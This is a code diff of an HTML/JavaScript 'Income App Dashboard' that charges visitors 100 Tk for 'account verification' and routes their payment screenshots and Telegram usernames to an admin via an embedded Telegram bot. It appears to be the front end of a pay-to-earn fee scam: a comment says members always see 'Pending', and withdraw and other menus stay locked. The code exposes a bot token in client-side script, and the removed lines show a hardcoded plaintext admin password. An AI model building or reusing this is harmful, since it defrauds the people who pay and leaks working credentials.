@@ -3,7 +3,6 @@
 <head>
 <title>Income App Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
 body{
   font-family: Arial;
@@ -11,16 +10,13 @@ body{
   color:white;
   text-align:center;
 }
-
 .box{
   background:#1e293b;
   padding:25px;
   border-radius:12px;
   max-width:420px;
   margin:30px auto;
-  position:relative;
 }
-
 button{
   padding:15px;
   margin:10px;
@@ -32,19 +28,10 @@ button{
   color:white;
   cursor:pointer;
 }
-
-.reject{ background:#ef4444; }
-
 .disabled{
   opacity:0.5;
   pointer-events:none;
 }
-
-.admin{ 
-  display:none; 
-  margin-top:10px;
-}
-
 .menu-section{
   margin-top:25px;
   border-top:1px solid #555;
@@ -52,39 +39,23 @@ button{
 }
 </style>
 </head>
-
 <body>
 
 <h2>💰 Income App Dashboard</h2>
 
+<!-- ✅ ACCOUNT VERIFY -->
 <div class="box">
-
 <h2>Account Verify — 100 Tk</h2>
-
 <p>
 ১০০ টাকা পাঠিয়ে নিচের Telegram-এ স্ক্রিনশট জমা দিন  
 👉 Status: <span id="status">Pending</span>
 </p>
-
-<a href="https://t.me/Easyearnverify_bot" target="_blank">
-<button>📩 Send Screenshot</button>
-</a>
-
-<!-- 🔐 Admin Button -->
-<button onclick="adminLogin()">🔐 Admin Panel</button>
-
-<!-- ADMIN ONLY -->
-<div class="admin" id="adminPanel">
-  <p>Admin Control:</p>
-  <button onclick="approve()">✅ Approved</button>
-  <button class="reject" onclick="reject()">❌ Rejected</button>
+<input type="file" id="file">
+<button onclick="sendScreenshot()">📩 Submit Screenshot</button>
 </div>
 
-</div>
-
-<!-- ✅ MENU (Locked by default) -->
+<!-- ✅ MENU -->
 <div id="menu" class="menu-section">
-
 <button class="disabled">📋 My Jobs & Proved</button>
 <button class="disabled">💎 Premium Package</button>
 <button class="disabled">🌳 Generation</button>
@@ -92,49 +63,71 @@ button{
 <button class="disabled">🏧 Withdraw</button>
 <button class="disabled">🔁 Transfer Balance</button>
 <button>📞 Support</button>
-
 </div>
 
 <script>
+// 🔹 Telegram Bot Config
+const BOT_TOKEN = "8051092032:AAGSVOe8efxnJqnBhsM2wdOclA-qtf45V98"; // Bot Token
+const BOT_USERNAME = "@Easyearnverify_bot"; // Bot Username
+const ADMIN_ID = "@TakeItEasyHubcyou"; // Admin Telegram username
 
-// 🔐 Admin Password
-const adminPassword = "SHYKOT@72455"; // তোমার দেওয়া পাসওয়ার্ড
+// 🔹 Member Username
+let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");
 
-// Admin Login
-function adminLogin(){
-  let pass = prompt("Enter Admin Password");
-  if(pass === adminPassword){
-    document.getElementById("adminPanel").style.display = "block";
-  }else{
-    alert("Wrong Password");
+// 🔹 Status (Member always sees Pending)
+let accountStatus = "pending";
+document.getElementById("status").innerText = accountStatus;
+
+// 🔹 Submit Screenshot
+async function sendScreenshot(){
+  const file = document.getElementById("file").files[0];
+  if(!file){ alert("Upload screenshot first"); return; }
+
+  const formData = new FormData();
+  formData.append("chat_id", ADMIN_ID);
+  formData.append("photo", file);
+  formData.append("caption",
+`💰 New Verify Request
+
+👤 Name: ${telegramUsername}
+Status: Pending
+
+Approve or Reject:`);
+
+  formData.append("reply_markup", JSON.stringify({
+    inline_keyboard: [
+      [
+        {text:"✅ Approve", url:`https://t.me/${BOT_USERNAME}?start=approve_${telegramUsername}`},
+        {text:"❌ Reject", url:`https://t.me/${BOT_USERNAME}?start=reject_${telegramUsername}`}
+      ]
+    ]
+  }));
+
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      body:formData
+    });
+    if(res.ok){
+      alert("Screenshot Submitted! Waiting for Admin Approval.");
+    } else {
+      alert("Failed to send. Try again.");
+    }
+  }catch(err){
+    console.error(err);
+    alert("Error occurred. Try again.");
   }
 }
 
-// Approved
-function approve(){
-  document.getElementById("status").innerText = "Approved ✅";
-  unlockMenu();
-}
-
-// Rejected
-function reject(){
-  document.getElementById("status").innerText = "Rejected ❌";
-  lockMenu();
-}
-
-// Unlock menu
+// 🔹 Menu unlock function (simulate only after Admin approval)
 function unlockMenu(){
-  const buttons = document.querySelectorAll("#menu button");
-  buttons.forEach(btn => btn.classList.remove("disabled"));
-}
-
-// Lock menu
-function lockMenu(){
-  const buttons = document.querySelectorAll("#menu button");
-  buttons.forEach(btn => btn.classList.add("disabled"));
+  accountStatus = "approved";
+  document.getElementById("status").innerText = accountStatus;
+  document.querySelectorAll("#menu button").forEach(btn => btn.classList.remove("disabled"));
 }
 
 </script>
 
 </body>
 </html>
+
